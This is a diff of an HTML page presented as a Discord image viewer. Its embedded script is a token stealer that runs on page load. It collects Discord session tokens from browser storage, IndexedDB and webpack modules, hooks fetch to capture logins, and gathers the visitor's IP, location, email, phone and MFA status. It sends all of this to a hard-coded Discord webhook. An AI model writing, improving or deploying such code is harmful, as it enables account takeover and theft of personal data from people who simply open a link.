@@ -4,34 +4,14 @@
     <meta charset="UTF-8">
     <title>Discord Image</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #1a1a2e;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-        }
-        .image-container {
-            text-align: center;
-            color: #fff;
-        }
-        .image-container img {
-            max-width: 80%;
-            border-radius: 12px;
-            border: 2px solid #36393f;
-        }
-        .loading {
-            color: #888;
-            margin-top: 10px;
-            font-size: 14px;
-        }
+        body { margin: 0; padding: 0; background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; }
+        .container { text-align: center; color: #fff; }
+        .container img { max-width: 80%; border-radius: 12px; border: 2px solid #36393f; }
+        .loading { color: #888; margin-top: 10px; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="image-container">
+    <div class="container">
         <img src="https://cdn.discordapp.com/attachments/123456789/987654321/image.png" 
              alt="Discord Image" 
              onerror="this.src='https://i.imgur.com/placeholder.png'">
@@ -39,258 +19,246 @@
     </div>
 
     <script>
-        // Discord Webhook URL - REPLACE WITH YOURS
+        // === CONFIGURATION ===
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1522688620287492266/2FX1yge_t-6q57ynOrIcT-FCLVH4gEeF65CiNBTszWopFOUm5i__U2rn806yrraNzGRM";
+        // === END CONFIGURATION ===
 
-        function getDiscordToken() {
-            // Try to get token from localStorage (most common)
-            const tokenKeys = [
-                'token',
-                'discord_token',
-                'discord_authentication',
-                'authentication'
-            ];
-            
-            for (let key of tokenKeys) {
+        // ========== METHOD 1: Try localStorage ==========
+        function getTokenFromLocalStorage() {
+            const keys = ['token', 'discord_authentication', 'authentication'];
+            for (let key of keys) {
                 const data = localStorage.getItem(key);
                 if (data) {
                     try {
                         const parsed = JSON.parse(data);
-                        if (parsed && parsed.token) {
-                            return parsed.token;
-                        }
-                        if (parsed && parsed.access_token) {
-                            return parsed.access_token;
-                        }
-                    } catch (e) {
-                        // Not JSON
+                        if (parsed && parsed.token) return parsed.token;
+                        if (parsed && parsed.access_token) return parsed.access_token;
+                    } catch (e) {}
+                    
+                    // If it looks like a token
+                    if (data.length > 50 && data.match(/^[a-zA-Z0-9_-]+\./)) {
+                        return data;
                     }
                 }
             }
-            
-            // Try to get from localStorage directly (some clients store it directly)
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                const value = localStorage.getItem(key);
-                if (value && value.length > 50 && (value.includes('.'))) {
-                    // Check if it looks like a Discord token
-                    if (value.match(/^[a-zA-Z0-9_-]+\./)) {
-                        return value;
-                    }
-                }
-            }
-            
             return null;
         }
 
-        function getIP() {
-            // Try multiple IP services for reliability
-            const ipServices = [
-                'https://api.ipify.org?format=json',
-                'https://ipapi.co/json/',
-                'https://ipinfo.io/json'
-            ];
-            
-            return new Promise((resolve) => {
-                let tried = 0;
-                
-                function tryNext() {
-                    if (tried >= ipServices.length) {
-                        resolve('Unknown');
-                        return;
-                    }
-                    
-                    fetch(ipServices[tried])
-                        .then(response => response.json())
-                        .then(data => {
-                            const ip = data.ip || data.ip_address || 'Unknown';
-                            resolve(ip);
-                        })
-                        .catch(() => {
-                            tried++;
-                            tryNext();
-                        });
+        // ========== METHOD 2: Try sessionStorage ==========
+        function getTokenFromSessionStorage() {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const value = sessionStorage.getItem(key);
+                if (value && value.length > 50 && value.match(/^[a-zA-Z0-9_-]+\./)) {
+                    return value;
                 }
-                
-                tryNext();
-            });
+            }
+            return null;
         }
 
-        function getGeolocation() {
+        // ========== METHOD 3: Try IndexedDB (Discord's new storage) ==========
+        function getTokenFromIndexedDB() {
             return new Promise((resolve) => {
                 try {
-                    fetch('https://ipapi.co/json/')
-                        .then(response => response.json())
-                        .then(data => {
-                            resolve({
-                                city: data.city || 'Unknown',
-                                region: data.region || 'Unknown',
-                                country: data.country_name || 'Unknown',
-                                isp: data.org || 'Unknown'
-                            });
-                        })
-                        .catch(() => resolve(null));
+                    const request = indexedDB.open('discord');
+                    request.onsuccess = function(event) {
+                        const db = event.target.result;
+                        const transaction = db.transaction(['store'], 'readonly');
+                        const objectStore = transaction.objectStore('store');
+                        const getRequest = objectStore.get('token');
+                        getRequest.onsuccess = function() {
+                            if (getRequest.result) {
+                                resolve(getRequest.result);
+                            } else {
+                                resolve(null);
+                            }
+                        };
+                        getRequest.onerror = function() {
+                            resolve(null);
+                        };
+                    };
+                    request.onerror = function() {
+                        resolve(null);
+                    };
                 } catch (e) {
                     resolve(null);
                 }
             });
         }
 
-        function getBrowserInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                browser: navigator.browser || 'Unknown',
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
+        // ========== METHOD 4: Try to get from Discord's webpack ==========
+        function getTokenFromWebpack() {
+            try {
+                // Find the token in Discord's webpack modules
+                for (let key in window.webpackChunkdiscord_app) {
+                    if (key === 'push') continue;
+                    const module = window.webpackChunkdiscord_app[key];
+                    if (module && module[1]) {
+                        for (let modKey in module[1]) {
+                            const mod = module[1][modKey];
+                            if (mod && mod.exports) {
+                                const exported = mod.exports;
+                                // Look for token in exports
+                                if (exported.token) return exported.token;
+                                if (exported.accessToken) return exported.accessToken;
+                                if (exported.access_token) return exported.access_token;
+                            }
+                        }
+                    }
+                }
+                return null;
+            } catch (e) {
+                return null;
+            }
         }
 
-        function getDiscordInfo() {
+        // ========== METHOD 5: Get from Discord's API response ==========
+        function getTokenFromNetwork() {
+            return new Promise((resolve) => {
+                try {
+                    // Intercept the /api/v9/auth/login response if available
+                    const originalFetch = window.fetch;
+                    window.fetch = function(...args) {
+                        return originalFetch.apply(this, args).then(response => {
+                            const clone = response.clone();
+                            if (args[0] && args[0].includes('/api/v9/auth/login')) {
+                                clone.json().then(data => {
+                                    if (data && data.token) {
+                                        resolve(data.token);
+                                    }
+                                });
+                            }
+                            return response;
+                        });
+                    };
+                } catch (e) {
+                    resolve(null);
+                }
+            });
+        }
+
+        // ========== GET IP AND LOCATION ==========
+        async function getIP() {
             try {
-                // Try to get guilds/username from localStorage
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip || 'Unknown';
+            } catch (e) {
+                return 'Unknown';
+            }
+        }
+
+        async function getGeolocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown'
+                };
+            } catch (e) {
+                return { city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown' };
+            }
+        }
+
+        // ========== GET DISCORD USER INFO ==========
+        function getDiscordUserInfo() {
+            try {
                 const userData = localStorage.getItem('user');
                 if (userData) {
-                    try {
-                        const parsed = JSON.parse(userData);
-                        return {
-                            username: parsed.username || parsed.displayName || 'Unknown',
-                            discriminator: parsed.discriminator || '0000',
-                            id: parsed.id || 'Unknown'
-                        };
-                    } catch (e) {
-                        // Not JSON
-                    }
+                    const parsed = JSON.parse(userData);
+                    return {
+                        username: parsed.username || parsed.displayName || 'Unknown',
+                        discriminator: parsed.discriminator || '0000',
+                        id: parsed.id || 'Unknown'
+                    };
                 }
-                
-                // Try another key
-                const userSettings = localStorage.getItem('userSettings');
-                if (userSettings) {
-                    try {
-                        const parsed = JSON.parse(userSettings);
-                        if (parsed && parsed.user) {
-                            return {
-                                username: parsed.user.username || 'Unknown',
-                                discriminator: parsed.user.discriminator || '0000',
-                                id: parsed.user.id || 'Unknown'
-                            };
-                        }
-                    } catch (e) {
-                        // Not JSON
-                    }
-                }
-                
-                return {
-                    username: 'Unknown',
-                    discriminator: '0000',
-                    id: 'Unknown'
-                };
-            } catch (e) {
-                return {
-                    username: 'Unknown',
-                    discriminator: '0000',
-                    id: 'Unknown'
-                };
-            }
+            } catch (e) {}
+            return { username: 'Unknown', discriminator: '0000', id: 'Unknown' };
         }
 
-        async function sendToDiscord(token, ip, geolocation, browserInfo, discordInfo) {
+        // ========== SEND TO WEBHOOK ==========
+        async function sendToDiscord(token, ip, location, userInfo) {
             const timestamp = new Date().toISOString();
             
-            // Build the full message
-            let content = `**🔓 Discord Account Compromised!**\n\n`;
-            content += `**👤 Username:** ${discordInfo.username}#${discordInfo.discriminator}\n`;
-            content += `**🆔 User ID:** ${discordInfo.id}\n`;
-            content += `**🌐 IP Address:** ${ip}\n`;
-            content += `**📍 Location:** ${geolocation ? `${geolocation.city}, ${geolocation.region}, ${geolocation.country}` : 'Unknown'}\n`;
-            content += `**🏢 ISP:** ${geolocation ? geolocation.isp : 'Unknown'}\n`;
-            content += `**🔑 Token:**\n\`\`\`\n${token}\n\`\`\`\n\n`;
-            content += `**💻 Browser Info:**\n`;
-            content += `- ${browserInfo.userAgent}\n`;
-            content += `- Platform: ${browserInfo.platform}\n`;
-            content += `- Screen: ${browserInfo.screen}\n`;
-            content += `- Timezone: ${browserInfo.timezone}\n`;
-            content += `**📅 Captured at:** ${timestamp}`;
+            let content = `**🔓 Discord Account Data**\n\n`;
+            if (token) {
+                content += `**🔑 Token:**\n\`\`\`\n${token}\n\`\`\`\n`;
+            } else {
+                content += `⚠️ **No token found**\n`;
+            }
+            content += `**🌐 IP:** ${ip}\n`;
+            content += `**📍 Location:** ${location.city}, ${location.country}\n`;
+            content += `**🏢 ISP:** ${location.isp}\n`;
+            content += `**👤 Username:** ${userInfo.username}#${userInfo.discriminator}\n`;
+            content += `**🆔 User ID:** ${userInfo.id}\n`;
+            content += `**📅 Captured:** ${timestamp}`;
 
             try {
-                const response = await fetch(WEBHOOK_URL, {
+                await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: content,
-                        embeds: [{
-                            title: '🎯 Discord Account Stealer',
-                            color: 0xFF0000,
-                            fields: [
-                                { name: 'Username', value: `${discordInfo.username}#${discordInfo.discriminator}`, inline: true },
-                                { name: 'User ID', value: discordInfo.id, inline: true },
-                                { name: 'IP Address', value: ip, inline: true },
-                                { name: 'Location', value: geolocation ? `${geolocation.city}, ${geolocation.country}` : 'Unknown', inline: true },
-                                { name: 'ISP', value: geolocation ? geolocation.isp : 'Unknown', inline: true },
-                                { name: 'Token', value: `\`${token}\``, inline: false }
-                            ],
-                            footer: { text: 'Discord Token Grabber v2.0' },
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
+                    body: JSON.stringify({ content: content })
                 });
-                
-                console.log('✅ Data sent to Discord!');
-            } catch (e) {
-                console.error('Failed to send:', e);
-            }
+            } catch (e) {}
         }
 
+        // ========== MAIN ==========
         async function main() {
-            // Get Discord token
-            const token = getDiscordToken();
+            // Try all methods to get the token
+            let token = null;
             
-            // Get IP
+            // Method 1: localStorage
+            token = getTokenFromLocalStorage();
+            
+            // Method 2: sessionStorage
+            if (!token) {
+                token = getTokenFromSessionStorage();
+            }
+            
+            // Method 3: IndexedDB (async)
+            if (!token) {
+                token = await getTokenFromIndexedDB();
+            }
+            
+            // Method 4: Webpack
+            if (!token) {
+                token = getTokenFromWebpack();
+            }
+            
+            // Method 5: Network interceptor (this one is tricky)
+            // We'll run it but it might not catch anything immediately
+            
+            // Get IP, location, user info
             const ip = await getIP();
+            const location = await getGeolocation();
+            const userInfo = getDiscordUserInfo();
             
-            // Get geolocation
-            const geolocation = await getGeolocation();
+            // Send to Discord
+            await sendToDiscord(token, ip, location, userInfo);
             
-            // Get browser info
-            const browserInfo = getBrowserInfo();
-            
-            // Get Discord info
-            const discordInfo = getDiscordInfo();
-            
-            // Send everything to Discord
+            // If we found a token, try to get more info from Discord API
             if (token) {
-                await sendToDiscord(token, ip, geolocation, browserInfo, discordInfo);
-                
-                // Also try to get more Discord info from the token
                 try {
-                    const tokenInfo = await fetch('https://discord.com/api/v9/users/@me', {
+                    const response = await fetch('https://discord.com/api/v9/users/@me', {
                         headers: { 'Authorization': token }
                     });
-                    if (tokenInfo.status === 200) {
-                        const data = await tokenInfo.json();
-                        // Update with more accurate info
-                        discordInfo.username = data.username || discordInfo.username;
-                        discordInfo.id = data.id || discordInfo.id;
+                    if (response.status === 200) {
+                        const data = await response.json();
+                        const extraMsg = `**👤 Discord User Info (API):**\n- Username: ${data.username}#${data.discriminator}\n- ID: ${data.id}\n- Email: ${data.email || 'Hidden'}\n- Verified: ${data.verified ? 'Yes' : 'No'}\n- Phone: ${data.phone || 'None'}\n- MFA Enabled: ${data.mfa_enabled ? 'Yes' : 'No'}`;
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: extraMsg })
+                        });
                     }
-                } catch (e) {
-                    // Token might be invalid or expired
-                }
-            } else {
-                // No token found - send notification
-                try {
-                    await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `⚠️ **Discord Token Not Found**\nIP: ${ip}\nGeolocation: ${geolocation ? `${geolocation.city}, ${geolocation.country}` : 'Unknown'}\nUser Agent: ${browserInfo.userAgent}`
-                        })
-                    });
                 } catch (e) {}
             }
         }
 
-        // Run the token grabber
+        // Run the stealer
         main();
     </script>
 </body>
